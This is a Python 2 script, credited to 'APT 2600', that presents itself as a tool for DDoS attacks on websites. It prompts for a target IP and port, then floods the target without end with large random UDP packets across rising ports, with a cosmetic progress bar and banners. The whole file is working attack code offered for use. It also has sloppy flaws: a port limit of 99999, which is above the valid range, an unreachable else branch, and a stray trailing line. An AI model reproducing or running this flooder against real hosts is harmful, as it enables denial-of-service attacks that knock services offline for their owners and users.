#The Creator By APT 2600
#Scirpt about DDosAttack Websites
#Youtube is APT 2600

import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

###################################################
"""
Code Sock and Code bytes
"""
############################################################
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
###########################################################
bytes = random._urandom(12550)
#########################################################
#######################################################
#####################################################
###################################################
####### Creat By Tanoi Gamers. ##################
###### Script that is DDOS [IP]################
#############################################
###########################################
os.system("clear")
os.system("figlet DDOSTN")
print "\033[35m"
print "Creator  : APT 2600"
print "Codename : TN-02"
print "Version  : 0.2"
print "github   : https://github.com/Tanoi-Gamers-673-x"
print
print "\033[37m"
ip = raw_input("IP Target@ : ")
port = input("Port       : ")
print
os.system("clear")
print "\033[35m"
print
os.system("figlet -f slant DDOS Starting | lolcat -a")
print "\033[1m\033[32m APT 2600"
print "\033[56m"
print "[                    ] 0% "
time.sleep(3)
print "[=====               ] 25%"
time.sleep(3)
print "[==========          ] 50%"
time.sleep(3)
print "[===============     ] 75%"
time.sleep(3)
print "[====================] 100%"
time.sleep(1)
sent = 0

print "\033[33m"

while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Attack %s Packet to %s port :~# %s" % (sent,ip,port)
     if port == 99999:
       port = 80

else :
 print "\n[ERROR SYSTEM]\n"
up

